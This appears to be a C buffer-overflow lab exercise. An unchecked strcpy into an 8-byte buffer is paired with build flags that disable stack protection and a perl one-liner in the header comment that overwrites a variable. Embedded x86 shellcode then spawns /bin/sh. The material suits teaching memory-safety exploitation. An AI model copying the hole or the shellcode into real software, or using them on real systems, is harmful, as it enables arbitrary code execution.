/*
 * gcc -o bof1 bof1.c -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -Wl,-z,execstack
 * ./bof1 $(perl -e 'print "A"x8 . "\xbc\x8a\x04\x08"')
 */

#include <stdio.h>
#include <string.h>

#define TEST1	"asdfjkl"

void secretfunc()
{
	char shellcode_21[] = 
		"\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

	void (*func)() = (void(*)())shellcode_21;
	func();
}

int main(int argc, char* argv[]) {
	int i = 0;
	char buf[8] = {0,};
	const char buf1[100] = "guybrush";
	char* ptr;

	strcpy(buf, argv[1]);

	if (i == 0x08048abc)
		secretfunc();
	else
		printf("Try Again\n");
	printf("CONSTANT 0x%p / 0x%p - %s\n", TEST1, &TEST1, TEST1);

	buf1[0] = 'a';
	ptr = (char *)buf1;
	ptr[0] = 'a';
	printf("ptr1 : %s\n", ptr);

	ptr = (char *)TEST1;
	ptr[0] = 'b';
	printf("ptr2 : %s\n", ptr);

	return 0;
}
